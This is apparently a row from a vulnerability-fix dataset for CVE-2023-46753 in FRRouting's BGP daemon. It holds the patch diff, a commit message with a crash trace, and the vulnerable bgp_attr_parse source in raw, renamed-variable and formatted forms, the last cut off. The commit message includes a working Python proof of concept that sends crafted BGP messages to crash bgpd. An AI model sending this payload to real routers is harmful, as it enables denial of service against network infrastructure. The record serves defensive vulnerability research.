 	/* ""An UPDATE message that contains the MP_UNREACH_NLRI is not required","{'deleted_lines': ['static int bgp_attr_check(struct peer *peer, struct attr *attr)', '\tif (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)'], 'added_lines': ['static int bgp_attr_check(struct peer *peer, struct attr *attr,', '\t\t\t  bgp_size_t length)', '\tif (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&', '\t    !length)']}",True,"An issue was discovered in FRRouting FRR through 9.0.1. A crash can occur for a crafted BGP UPDATE message without mandatory attributes, e.g., one with only an unknown transit attribute.",7.5,HIGH,2,valid,2023-10-23T20:34:10Z,4
CVE-2023-46753,['CWE-Other'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,FRRouting/frr,"bgpd: Check mandatory attributes more carefully for UPDATE message

If we send a crafted BGP UPDATE message without mandatory attributes, we do
not check if the length of the path attributes is zero or not. We only check
if attr->flag is at least set or not. Imagine we send only unknown transit
attribute, then attr->flag is always 0. Also, this is true only if graceful-restart
capability is received.

A crash:

```
bgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)
bgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17
BGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...
BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]
BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]
BGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]
BGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]
BGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]
BGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]
BGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]
BGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]
BGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]
BGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]
BGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]
BGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]
BGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]
BGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]
```

Sending:

```
import socket
import time

OPEN = (b""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff""
b""\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02""
b""\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02""
b""\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00""
b""\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d""
b""\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01""
b""\x80\x00\x00\x00"")

KEEPALIVE = (b""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff""
b""\xff\xff\xff\xff\xff\xff\x00\x13\x04"")

UPDATE = bytearray.fromhex(""ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000"")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.2', 179))
s.send(OPEN)
data = s.recv(1024)
s.send(KEEPALIVE)
data = s.recv(1024)
s.send(UPDATE)
data = s.recv(1024)
time.sleep(1000)
s.close()
```

Reported-by: Iggy Frankovic <iggyfran@amazon.com>
Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",d8482bf011cb2b173e85b65b4bf3d5061250cdb9,https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9,bgpd/bgp_attr.c,bgp_attr_parse,"enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
bgp_size_t size,
struct bgp_nlri *mp_update,
struct bgp_nlri *mp_withdraw)
{
enum bgp_attr_parse_ret ret;
uint8_t flag = 0;
uint8_t type = 0;
bgp_size_t length;
uint8_t *startp, *endp;
uint8_t *attr_endp;
uint8_t seen[BGP_ATTR_BITMAP_SIZE];
struct aspath *as4_path = NULL;
as_t as4_aggregator = 0;
struct in_addr as4_aggregator_addr = {.s_addr = 0};
struct transit *transit;
memset(seen, 0, BGP_ATTR_BITMAP_SIZE);
endp = BGP_INPUT_PNT(peer) + size;
while (BGP_INPUT_PNT(peer) < endp) {
startp = BGP_INPUT_PNT(peer);
if ((endp - startp) < BGP_ATTR_MIN_LEN) {
flog_warn(
EC_BGP_ATTRIBUTE_TOO_SMALL,
""%s: error BGP attribute length %lu is smaller than min len"",
peer->host,
(unsigned long)(endp
- stream_pnt(BGP_INPUT(peer))));
if (peer->sort != BGP_PEER_EBGP) {
bgp_notify_send(peer->connection,
BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
ret = BGP_ATTR_PARSE_ERROR;
} else {
ret = BGP_ATTR_PARSE_WITHDRAW;
}
goto done;
}
flag = 0xF0 & stream_getc(BGP_INPUT(peer));
type = stream_getc(BGP_INPUT(peer));
if (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN)
&& ((endp - startp) < (BGP_ATTR_MIN_LEN + 1))) {
flog_warn(
EC_BGP_EXT_ATTRIBUTE_TOO_SMALL,
""%s: Extended length set, but just %lu bytes of attr header"",
peer->host,
(unsigned long)(endp
- stream_pnt(BGP_INPUT(peer))));
if (peer->sort != BGP_PEER_EBGP) {
bgp_notify_send(peer->connection,
BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
ret = BGP_ATTR_PARSE_ERROR;
} else {
ret = BGP_ATTR_PARSE_WITHDRAW;
}
goto done;
}
if (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN))
length = stream_getw(BGP_INPUT(peer));
else
length = stream_getc(BGP_INPUT(peer));
attr_endp = BGP_INPUT_PNT(peer) + length;
if (attr_endp > endp) {
flog_warn(
EC_BGP_ATTRIBUTE_TOO_LARGE,
""%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p"",
peer->host, type, length, size, attr_endp,
endp);
if (peer->sort != BGP_PEER_EBGP) {
unsigned char ndata[peer->max_packet_size];
memset(ndata, 0x00, sizeof(ndata));
size_t lfl =
CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN) ? 2 : 1;
stream_rewind_getp(BGP_INPUT(peer), (1 + lfl));
stream_get(&ndata[0], BGP_INPUT(peer), 1);
stream_get(&ndata[1], BGP_INPUT(peer), lfl);
size_t atl = attr_endp - startp;
size_t ndl = MIN(atl, STREAM_READABLE(BGP_INPUT(peer)));
stream_get(&ndata[lfl + 1], BGP_INPUT(peer), ndl);
bgp_notify_send_with_data(peer->connection,
BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_ATTR_LENG_ERR,
ndata, ndl + lfl + 1);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
} else {
flog_warn(
EC_BGP_ATTRIBUTE_PARSE_WITHDRAW,
""%s: Attribute %s, parse error - treating as withdrawal"",
peer->host, lookup_msg(attr_str, type, NULL));
ret = BGP_ATTR_PARSE_WITHDRAW;
stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
goto done;
}
}
if (CHECK_BITMAP(seen, type)) {
if (peer->sort != BGP_PEER_EBGP ||
type == BGP_ATTR_MP_REACH_NLRI || type == BGP_ATTR_MP_UNREACH_NLRI) {
flog_warn(
EC_BGP_ATTRIBUTE_REPEATED,
""%s: error BGP attribute type %d appears twice in a message"",
peer->host, type);
bgp_notify_send(peer->connection,
BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_MAL_ATTR);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
} else {
flog_warn(
EC_BGP_ATTRIBUTE_REPEATED,
""%s: error BGP attribute type %d appears twice in a message - discard attribute"",
peer->host, type);
stream_set_getp(BGP_INPUT(peer),
(startp - STREAM_DATA(BGP_INPUT(peer))) + (attr_endp - startp));
continue;
}
}
SET_BITMAP(seen, type);
struct bgp_attr_parser_args attr_args = {
.peer = peer,
.length = length,
.attr = attr,
.type = type,
.flags = flag,
.startp = startp,
.total = attr_endp - startp,
};
if (bgp_attr_flag_invalid(&attr_args)) {
ret = bgp_attr_malformed(
&attr_args, BGP_NOTIFY_UPDATE_ATTR_FLAG_ERR,
attr_args.total);
if (ret == BGP_ATTR_PARSE_PROCEED)
continue;
stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
goto done;
}
switch (type) {
case BGP_ATTR_ORIGIN:
ret = bgp_attr_origin(&attr_args);
break;
case BGP_ATTR_AS_PATH:
ret = bgp_attr_aspath(&attr_args);
break;
case BGP_ATTR_AS4_PATH:
ret = bgp_attr_as4_path(&attr_args, &as4_path);
break;
case BGP_ATTR_NEXT_HOP:
ret = bgp_attr_nexthop(&attr_args);
break;
case BGP_ATTR_MULTI_EXIT_DISC:
ret = bgp_attr_med(&attr_args);
break;
case BGP_ATTR_LOCAL_PREF:
ret = bgp_attr_local_pref(&attr_args);
break;
case BGP_ATTR_ATOMIC_AGGREGATE:
ret = bgp_attr_atomic(&attr_args);
break;
case BGP_ATTR_AGGREGATOR:
ret = bgp_attr_aggregator(&attr_args);
break;
case BGP_ATTR_AS4_AGGREGATOR:
ret = bgp_attr_as4_aggregator(&attr_args,
&as4_aggregator,
&as4_aggregator_addr);
break;
case BGP_ATTR_COMMUNITIES:
ret = bgp_attr_community(&attr_args);
break;
case BGP_ATTR_LARGE_COMMUNITIES:
ret = bgp_attr_large_community(&attr_args);
break;
case BGP_ATTR_ORIGINATOR_ID:
ret = bgp_attr_originator_id(&attr_args);
break;
case BGP_ATTR_CLUSTER_LIST:
ret = bgp_attr_cluster_list(&attr_args);
break;
case BGP_ATTR_MP_REACH_NLRI:
ret = bgp_mp_reach_parse(&attr_args, mp_update);
break;
case BGP_ATTR_MP_UNREACH_NLRI:
ret = bgp_mp_unreach_parse(&attr_args, mp_withdraw);
break;
case BGP_ATTR_EXT_COMMUNITIES:
ret = bgp_attr_ext_communities(&attr_args);
break;
#ifdef ENABLE_BGP_VNC_ATTR
case BGP_ATTR_VNC:
#endif
case BGP_ATTR_ENCAP:
ret = bgp_attr_encap(&attr_args);
break;
case BGP_ATTR_PREFIX_SID:
ret = bgp_attr_prefix_sid(&attr_args);
break;
case BGP_ATTR_PMSI_TUNNEL:
ret = bgp_attr_pmsi_tunnel(&attr_args);
break;
case BGP_ATTR_IPV6_EXT_COMMUNITIES:
ret = bgp_attr_ipv6_ext_communities(&attr_args);
break;
case BGP_ATTR_OTC:
ret = bgp_attr_otc(&attr_args);
break;
case BGP_ATTR_AIGP:
ret = bgp_attr_aigp(&attr_args);
break;
default:
ret = bgp_attr_unknown(&attr_args);
break;
}
if (ret == BGP_ATTR_PARSE_ERROR_NOTIFYPLS) {
bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_MAL_ATTR);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
}
if (ret == BGP_ATTR_PARSE_ERROR) {
flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,
""%s: Attribute %s, parse error"", peer->host,
lookup_msg(attr_str, type, NULL));
goto done;
}
if (ret == BGP_ATTR_PARSE_WITHDRAW) {
flog_warn(
EC_BGP_ATTRIBUTE_PARSE_WITHDRAW,
""%s: Attribute %s, parse error - treating as withdrawal"",
peer->host, lookup_msg(attr_str, type, NULL));
stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
goto done;
}
if (BGP_INPUT_PNT(peer) != attr_endp) {
flog_warn(EC_BGP_ATTRIBUTE_FETCH_ERROR,
""%s: BGP attribute %s, fetch error"",
peer->host, lookup_msg(attr_str, type, NULL));
bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
}
}
if (!attr->mp_nexthop_len || mp_update->safi != SAFI_LABELED_UNICAST)
attr->label_index = BGP_INVALID_LABEL_INDEX;
if (BGP_INPUT_PNT(peer) != endp) {
flog_warn(EC_BGP_ATTRIBUTES_MISMATCH,
""%s: BGP attribute %s, length mismatch"", peer->host,
lookup_msg(attr_str, type, NULL));
bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
}
if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI))) {
if (bgp_attr_nexthop_valid(peer, attr) < 0) {
ret = BGP_ATTR_PARSE_ERROR;
goto done;
}
}
ret = bgp_attr_check(peer, attr);
if (ret < 0)
goto done;
if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))
&& bgp_attr_munge_as4_attrs(peer, attr, as4_path, as4_aggregator,
&as4_aggregator_addr)) {
bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
BGP_NOTIFY_UPDATE_MAL_ATTR);
ret = BGP_ATTR_PARSE_ERROR;
goto done;
}
if (attr->flag & (ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))) {
ret = bgp_attr_aspath_check(peer, attr);
if (ret != BGP_ATTR_PARSE_PROCEED)
goto done;
}
ret = BGP_ATTR_PARSE_PROCEED;
done:
aspath_unintern(&as4_path);
transit = bgp_attr_get_transit(attr);
if (ret != BGP_ATTR_PARSE_ERROR) {
if (transit)
bgp_attr_set_transit(attr, transit_intern(transit));
if (attr->encap_subtlvs)
attr->encap_subtlvs = encap_intern(attr->encap_subtlvs,
ENCAP_SUBTLV_TYPE);
#ifdef ENABLE_BGP_VNC
struct bgp_attr_encap_subtlv *vnc_subtlvs =
bgp_attr_get_vnc_subtlvs(attr);
if (vnc_subtlvs)
bgp_attr_set_vnc_subtlvs(
attr,
encap_intern(vnc_subtlvs, VNC_SUBTLV_TYPE));
#endif
} else {
if (transit) {
transit_free(transit);
bgp_attr_set_transit(attr, NULL);
}
bgp_attr_flush_encap(attr);
};
transit = bgp_attr_get_transit(attr);
if (transit)
assert(transit->refcnt > 0);
if (attr->encap_subtlvs)
assert(attr->encap_subtlvs->refcnt > 0);
#ifdef ENABLE_BGP_VNC
struct bgp_attr_encap_subtlv *vnc_subtlvs =
bgp_attr_get_vnc_subtlvs(attr);
if (vnc_subtlvs)
assert(vnc_subtlvs->refcnt > 0);
#endif
return ret;
}","enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
bgp_size_t VAR_0,
struct bgp_nlri *VAR_1,
struct bgp_nlri *VAR_2)
{
enum bgp_attr_parse_ret VAR_3;
uint8_t VAR_4 = 0;
uint8_t VAR_5 = 0;
bgp_size_t VAR_6;
uint8_t *VAR_7, *VAR_8;
uint8_t *VAR_9;
uint8_t VAR_10[VAR_11];
struct aspath *VAR_12 = NULL;
as_t VAR_13 = 0;
struct in_addr VAR_14 = {.s_addr = 0};
struct transit *transit;
memset(VAR_10, 0, VAR_11);
VAR_8 = BGP_INPUT_PNT(peer) + VAR_0;
while (BGP_INPUT_PNT(peer) < VAR_8) {
VAR_7 = BGP_INPUT_PNT(peer);
if ((VAR_8 - VAR_7) < VAR_15) {
flog_warn(
VAR_16,
""%s: error BGP attribute length %lu is smaller than min len"",
peer->host,
(unsigned long)(VAR_8
- stream_pnt(BGP_INPUT(peer))));
if (peer->sort != VAR_17) {
bgp_notify_send(peer->connection,
VAR_18,
VAR_19);
VAR_3 = VAR_20;
} else {
VAR_3 = VAR_21;
}
goto done;
}
VAR_4 = 0xF0 & stream_getc(BGP_INPUT(peer));
VAR_5 = stream_getc(BGP_INPUT(peer));
if (CHECK_FLAG(VAR_4, VAR_22)
&& ((VAR_8 - VAR_7) < (VAR_15 + 1))) {
flog_warn(
VAR_23,
""%s: Extended length set, but just %lu bytes of attr header"",
peer->host,
(unsigned long)(VAR_8
- stream_pnt(BGP_INPUT(peer))));
if (peer->sort != VAR_17) {
bgp_notify_send(peer->connection,
VAR_18,
VAR_19);
VAR_3 = VAR_20;
} else {
VAR_3 = VAR_21;
}
goto done;
}
if (CHECK_FLAG(VAR_4, VAR_22))
VAR_6 = stream_getw(BGP_INPUT(peer));
else
VAR_6 = stream_getc(BGP_INPUT(peer));
VAR_9 = BGP_INPUT_PNT(peer) + VAR_6;
if (VAR_9 > VAR_8) {
flog_warn(
VAR_24,
""%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p"",
peer->host, VAR_5, VAR_6, VAR_0, VAR_9,
VAR_8);
if (peer->sort != VAR_17) {
unsigned char VAR_25[peer->max_packet_size];
memset(VAR_25, 0x00, sizeof(VAR_25));
size_t VAR_26 =
CHECK_FLAG(VAR_4, VAR_22) ? 2 : 1;
stream_rewind_getp(BGP_INPUT(peer), (1 + VAR_26));
stream_get(&VAR_25[0], BGP_INPUT(peer), 1);
stream_get(&VAR_25[1], BGP_INPUT(peer), VAR_26);
size_t VAR_27 = VAR_9 - VAR_7;
size_t VAR_28 = MIN(VAR_27, STREAM_READABLE(BGP_INPUT(peer)));
stream_get(&VAR_25[VAR_26 + 1], BGP_INPUT(peer), VAR_28);
bgp_notify_send_with_data(peer->connection,
VAR_18,
VAR_19,
VAR_25, VAR_28 + VAR_26 + 1);
VAR_3 = VAR_20;
goto done;
} else {
flog_warn(
VAR_29,
""%s: Attribute %s, parse error - treating as withdrawal"",
peer->host, lookup_msg(VAR_30, VAR_5, NULL));
VAR_3 = VAR_21;
stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
goto done;
}
}
if (CHECK_BITMAP(VAR_10, VAR_5)) {
if (peer->sort != VAR_17 ||
VAR_5 == VAR_31 || VAR_5 == VAR_32) {
flog_warn(
VAR_33,
""%s: error BGP attribute type %d appears twice in a message"",
peer->host, VAR_5);
bgp_notify_send(peer->connection,
VAR_18,
VAR_34);
VAR_3 = VAR_20;
goto done;
} else {
flog_warn(
VAR_33,
""%s: error BGP attribute type %d appears twice in a message - discard attribute"",
peer->host, VAR_5);
stream_set_getp(BGP_INPUT(peer),
(VAR_7 - STREAM_DATA(BGP_INPUT(peer))) + (VAR_9 - VAR_7));
continue;
}
}
SET_BITMAP(VAR_10, VAR_5);
struct bgp_attr_parser_args VAR_35 = {
.peer = peer,
.length = VAR_6,
.attr = attr,
.type = VAR_5,
.flags = VAR_4,
.startp = VAR_7,
.total = VAR_9 - VAR_7,
};
if (bgp_attr_flag_invalid(&VAR_35)) {
VAR_3 = bgp_attr_malformed(
&VAR_35, VAR_36,
VAR_35.total);
if (VAR_3 == VAR_37)
continue;
stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
goto done;
}
switch (VAR_5) {
case VAR_38:
VAR_3 = bgp_attr_origin(&VAR_35);
break;
case VAR_39:
VAR_3 = bgp_attr_aspath(&VAR_35);
break;
case VAR_40:
VAR_3 = bgp_attr_as4_path(&VAR_35, &VAR_12);
break;
case VAR_41:
VAR_3 = bgp_attr_nexthop(&VAR_35);
break;
case VAR_42:
VAR_3 = bgp_attr_med(&VAR_35);
break;
case VAR_43:
VAR_3 = bgp_attr_local_pref(&VAR_35);
break;
case VAR_44:
VAR_3 = bgp_attr_atomic(&VAR_35);
break;
case VAR_45:
VAR_3 = bgp_attr_aggregator(&VAR_35);
break;
case VAR_46:
VAR_3 = bgp_attr_as4_aggregator(&VAR_35,
&VAR_13,
&VAR_14);
break;
case VAR_47:
VAR_3 = bgp_attr_community(&VAR_35);
break;
case VAR_48:
VAR_3 = bgp_attr_large_community(&VAR_35);
break;
case VAR_49:
VAR_3 = bgp_attr_originator_id(&VAR_35);
break;
case VAR_50:
VAR_3 = bgp_attr_cluster_list(&VAR_35);
break;
case VAR_31:
VAR_3 = bgp_mp_reach_parse(&VAR_35, VAR_1);
break;
case VAR_32:
VAR_3 = bgp_mp_unreach_parse(&VAR_35, VAR_2);
break;
case VAR_51:
VAR_3 = bgp_attr_ext_communities(&VAR_35);
break;
#ifdef VAR_52
case VAR_53:
#endif
case VAR_54:
VAR_3 = bgp_attr_encap(&VAR_35);
break;
case VAR_55:
VAR_3 = bgp_attr_prefix_sid(&VAR_35);
break;
case VAR_56:
VAR_3 = bgp_attr_pmsi_tunnel(&VAR_35);
break;
case VAR_57:
VAR_3 = bgp_attr_ipv6_ext_communities(&VAR_35);
break;
case VAR_58:
VAR_3 = bgp_attr_otc(&VAR_35);
break;
case VAR_59:
VAR_3 = bgp_attr_aigp(&VAR_35);
break;
default:
VAR_3 = bgp_attr_unknown(&VAR_35);
break;
}
if (VAR_3 == VAR_60) {
bgp_notify_send(peer->connection, VAR_18,
VAR_34);
VAR_3 = VAR_20;
goto done;
}
if (VAR_3 == VAR_20) {
flog_warn(VAR_61,
""%s: Attribute %s, parse error"", peer->host,
lookup_msg(VAR_30, VAR_5, NULL));
goto done;
}
if (VAR_3 == VAR_21) {
flog_warn(
VAR_29,
""%s: Attribute %s, parse error - treating as withdrawal"",
peer->host, lookup_msg(VAR_30, VAR_5, NULL));
stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
goto done;
}
if (BGP_INPUT_PNT(peer) != VAR_9) {
flog_warn(VAR_62,
""%s: BGP attribute %s, fetch error"",
peer->host, lookup_msg(VAR_30, VAR_5, NULL));
bgp_notify_send(peer->connection, VAR_18,
VAR_19);
VAR_3 = VAR_20;
goto done;
}
}
if (!attr->mp_nexthop_len || VAR_1->safi != VAR_63)
attr->label_index = VAR_64;
if (BGP_INPUT_PNT(peer) != VAR_8) {
flog_warn(VAR_65,
""%s: BGP attribute %s, length mismatch"", peer->host,
lookup_msg(VAR_30, VAR_5, NULL));
bgp_notify_send(peer->connection, VAR_18,
VAR_19);
VAR_3 = VAR_20;
goto done;
}
if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_41))
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_31))) {
if (bgp_attr_nexthop_valid(peer, attr) < 0) {
VAR_3 = VAR_20;
goto done;
}
}
VAR_3 = bgp_attr_check(peer, attr);
if (VAR_3 < 0)
goto done;
if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_39))
&& bgp_attr_munge_as4_attrs(peer, attr, VAR_12, VAR_13,
&VAR_14)) {
bgp_notify_send(peer->connection, VAR_18,
VAR_34);
VAR_3 = VAR_20;
goto done;
}
if (attr->flag & (ATTR_FLAG_BIT(VAR_39))) {
VAR_3 = bgp_attr_aspath_check(peer, attr);
if (VAR_3 != VAR_37)
goto done;
}
VAR_3 = VAR_37;
done:
aspath_unintern(&VAR_12);
transit = bgp_attr_get_transit(attr);
if (VAR_3 != VAR_20) {
if (transit)
bgp_attr_set_transit(attr, transit_intern(transit));
if (attr->encap_subtlvs)
attr->encap_subtlvs = encap_intern(attr->encap_subtlvs,
VAR_66);
#ifdef VAR_67
struct bgp_attr_encap_subtlv *VAR_68 =
bgp_attr_get_vnc_subtlvs(attr);
if (VAR_68)
bgp_attr_set_vnc_subtlvs(
attr,
encap_intern(VAR_68, VAR_69));
#endif
} else {
if (transit) {
transit_free(transit);
bgp_attr_set_transit(attr, NULL);
}
bgp_attr_flush_encap(attr);
};
transit = bgp_attr_get_transit(attr);
if (transit)
assert(transit->refcnt > 0);
if (attr->encap_subtlvs)
assert(attr->encap_subtlvs->refcnt > 0);
#ifdef VAR_67
struct bgp_attr_encap_subtlv *VAR_68 =
bgp_attr_get_vnc_subtlvs(attr);
if (VAR_68)
assert(VAR_68->refcnt > 0);
#endif
return VAR_3;
}",FRRouting/frr/d8482bf011cb2b173e85b65b4bf3d5061250cdb9/bgp_attr.c/vul/before/0.json,"enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
				       bgp_size_t size,
				       struct bgp_nlri *mp_update,
				       struct bgp_nlri *mp_withdraw)
{
	enum bgp_attr_parse_ret ret;
	uint8_t flag = 0;
	uint8_t type = 0;
	bgp_size_t length = 0;
	uint8_t *startp, *endp;
	uint8_t *attr_endp;
	uint8_t seen[BGP_ATTR_BITMAP_SIZE];
	/* we need the as4_path only until we have synthesized the as_path with
	 * it */
	/* same goes for as4_aggregator */
	struct aspath *as4_path = NULL;
	as_t as4_aggregator = 0;
	struct in_addr as4_aggregator_addr = {.s_addr = 0};
	struct transit *transit;

	/* Initialize bitmap. */
	memset(seen, 0, BGP_ATTR_BITMAP_SIZE);

	/* End pointer of BGP attribute. */
	endp = BGP_INPUT_PNT(peer) + size;

	/* Get attributes to the end of attribute length. */
	while (BGP_INPUT_PNT(peer) < endp) {
		startp = BGP_INPUT_PNT(peer);

		/* Fewer than three octets remain (or fewer than four
		 * octets, if the Attribute Flags field has the Extended
		 * Length bit set) when beginning to parse the attribute.
		 * That is, this case exists if there remains unconsumed
		 * data in the path attributes but yet insufficient data
		 * to encode a single minimum-sized path attribute.
		 *
		 * An error condition exists and the ""treat-as-withdraw""
		 * approach MUST be used (unless some other, more severe
		 * error is encountered dictating a stronger approach),
		 * and the Total Attribute Length MUST be relied upon to
		 * enable the beginning of the NLRI field to be located.
		 */

		/* Check remaining length check.*/
		if ((endp - startp) < BGP_ATTR_MIN_LEN) {
			/* XXX warning: long int format, int arg (arg 5) */
			flog_warn(
				EC_BGP_ATTRIBUTE_TOO_SMALL,
				""%s: error BGP attribute length %lu is smaller than min len"",
				peer->host,
				(unsigned long)(endp
						- stream_pnt(BGP_INPUT(peer))));

			if (peer->sort != BGP_PEER_EBGP) {
				bgp_notify_send(peer->connection,
						BGP_NOTIFY_UPDATE_ERR,
						BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
				ret = BGP_ATTR_PARSE_ERROR;
			} else {
				ret = BGP_ATTR_PARSE_WITHDRAW;
			}

			goto done;
		}

		/* Fetch attribute flag and type.
		 * The lower-order four bits of the Attribute Flags octet are
		 * unused. They MUST be zero when sent and MUST be ignored when
		 * received.
		 */
		flag = 0xF0 & stream_getc(BGP_INPUT(peer));
		type = stream_getc(BGP_INPUT(peer));

		/* Check whether Extended-Length applies and is in bounds */
		if (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN)
		    && ((endp - startp) < (BGP_ATTR_MIN_LEN + 1))) {
			flog_warn(
				EC_BGP_EXT_ATTRIBUTE_TOO_SMALL,
				""%s: Extended length set, but just %lu bytes of attr header"",
				peer->host,
				(unsigned long)(endp
						- stream_pnt(BGP_INPUT(peer))));

			if (peer->sort != BGP_PEER_EBGP) {
				bgp_notify_send(peer->connection,
						BGP_NOTIFY_UPDATE_ERR,
						BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
				ret = BGP_ATTR_PARSE_ERROR;
			} else {
				ret = BGP_ATTR_PARSE_WITHDRAW;
			}

			goto done;
		}

		/* Check extended attribue length bit. */
		if (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN))
			length = stream_getw(BGP_INPUT(peer));
		else
			length = stream_getc(BGP_INPUT(peer));

		/* Overflow check. */
		attr_endp = BGP_INPUT_PNT(peer) + length;

		if (attr_endp > endp) {
			flog_warn(
				EC_BGP_ATTRIBUTE_TOO_LARGE,
				""%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p"",
				peer->host, type, length, size, attr_endp,
				endp);

			/* Only relax error handling for eBGP peers */
			if (peer->sort != BGP_PEER_EBGP) {
				/*
				 * RFC 4271 6.3
				 * If any recognized attribute has an Attribute
				 * Length that conflicts with the expected length
				 * (based on the attribute type code), then the
				 * Error Subcode MUST be set to Attribute Length
				 * Error.  The Data field MUST contain the erroneous
				 * attribute (type, length, and value).
				 * ----------
				 * We do not currently have a good way to determine the
				 * length of the attribute independent of the length
				 * received in the message. Instead we send the
				 * minimum between the amount of data we have and the
				 * amount specified by the attribute length field.
				 *
				 * Instead of directly passing in the packet buffer and
				 * offset we use the stream_get* functions to read into
				 * a stack buffer, since they perform bounds checking
				 * and we are working with untrusted data.
				 */
				unsigned char ndata[peer->max_packet_size];

				memset(ndata, 0x00, sizeof(ndata));
				size_t lfl =
					CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN) ? 2 : 1;
				/* Rewind to end of flag field */
				stream_rewind_getp(BGP_INPUT(peer), (1 + lfl));
				/* Type */
				stream_get(&ndata[0], BGP_INPUT(peer), 1);
				/* Length */
				stream_get(&ndata[1], BGP_INPUT(peer), lfl);
				/* Value */
				size_t atl = attr_endp - startp;
				size_t ndl = MIN(atl, STREAM_READABLE(BGP_INPUT(peer)));

				stream_get(&ndata[lfl + 1], BGP_INPUT(peer), ndl);

				bgp_notify_send_with_data(peer->connection,
							  BGP_NOTIFY_UPDATE_ERR,
